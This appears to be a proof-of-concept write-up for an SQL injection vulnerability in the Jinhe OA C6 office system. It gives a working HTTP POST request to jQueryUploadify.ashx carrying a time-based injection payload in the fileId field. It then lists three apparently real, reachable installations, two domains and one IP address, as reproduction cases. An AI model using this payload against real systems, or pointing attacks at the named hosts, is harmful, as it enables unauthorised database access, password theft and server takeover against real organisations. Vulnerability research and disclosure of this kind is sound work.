# introduce

​	The Jinhe OA collaborative office management system software (referred to as Jinhe OA) adheres to the principles of simplicity, applicability, and efficiency, fits the actual needs of enterprises and institutions, implements universal, standardized, intelligent, and humanized product design, fully embodies the core idea of standardized management and improved office efficiency of enterprises and institutions, and provides users with a complete set of standard office automation solutions to help enterprises and institutions quickly establish convenient and standardized office environments.

# Vulnerability description

​	There is an SQL injection vulnerability at the Jinhe OA C6 jQueryUploadify.ashx interface. Attackers can not only exploit the SQL injection vulnerability to obtain information from the database (such as administrator backend passwords, site user personal information), but also write trojans to the server in high privilege situations to further gain server system privileges.

# Principle of Vulnerability

```
POST /C6/JQueryUpload/AjaxFile/jQueryUploadify.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Type: application/x-www-form-urlencoded
 
type=delete&fileId=-99';WAITFOR+DELAY'0:0:5'--

```

# Case reproduction

### Case one:

http://oa.fapai.com/c6/JHSoft.Web.Login/PassWordNew.aspx

![case1](./pic/case1.png)

### Case two:

http://oa.thsolar.com/c6/Jhsoft.Web.login/PassWordSlideFull.aspx

![case1](./pic/case2.png)



### Case Three:

http://221.239.86.228/C6/Jhsoft.Web.login/PassWordNew.aspx

![case1](./pic/case3.png)

# The affected version

V6.0